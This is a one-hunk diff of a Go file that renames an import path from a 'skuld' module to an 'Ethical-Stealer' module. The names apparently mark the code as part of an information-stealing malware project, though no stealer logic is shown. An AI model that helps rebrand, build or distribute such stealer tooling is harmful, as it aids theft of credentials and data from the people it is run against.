@@ -10,7 +10,7 @@ import (
 	"strings"
 	"syscall"
 
-	"github.com/hackirby/skuld/utils/program"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/program"
 	"github.com/shirou/gopsutil/v3/disk"
 )
 
